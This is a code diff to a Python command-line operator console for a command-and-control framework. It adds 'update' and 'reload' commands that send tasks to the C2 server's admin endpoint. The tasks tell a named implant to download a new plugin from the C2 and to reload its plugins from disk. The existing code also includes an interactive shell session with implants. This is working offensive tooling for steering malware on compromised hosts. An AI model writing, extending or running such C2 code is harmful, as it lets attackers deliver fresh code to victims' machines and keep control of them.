@@ -181,5 +181,36 @@ def interactive_shell(implant_id):
         click.echo(f"[!] Error during shell session: {e}", err=True)
 
 
+@cli.command("update")
+@click.argument("implant_id")
+@click.argument("plugin_name")
+def update_plugin(implant_id, plugin_name):
+    """Tasks an implant to download a new plugin from the C2."""
+    click.echo(f"[*] Tasking implant {implant_id} to download plugin '{plugin_name}'...")
+    task_payload = {
+        "command": "start_plugin",
+        "args": {"plugin_name": "update", "plugin_to_download": plugin_name}
+    }
+    try:
+        response = requests.post(f"{C2_URL_HTTP}/admin/tasks/{implant_id}", json=task_payload)
+        response.raise_for_status()
+        click.echo(click.style(f"[+] Update task sent successfully.", fg="green"))
+    except requests.exceptions.RequestException as e:
+        handle_request_error(e)
+
+@cli.command("reload")
+@click.argument("implant_id")
+def reload_plugins(implant_id):
+    """Tasks an implant to reload its plugins from disk."""
+    click.echo(f"[*] Sending 'reload_plugins' command to implant {implant_id}...")
+    task_payload = { "command": "reload_plugins", "args": {} }
+    try:
+        response = requests.post(f"{C2_URL_HTTP}/admin/tasks/{implant_id}", json=task_payload)
+        response.raise_for_status()
+        click.echo(click.style(f"[+] Reload command sent successfully.", fg="green"))
+    except requests.exceptions.RequestException as e:
+        handle_request_error(e)
+
+
 if __name__ == "__main__":
     cli()
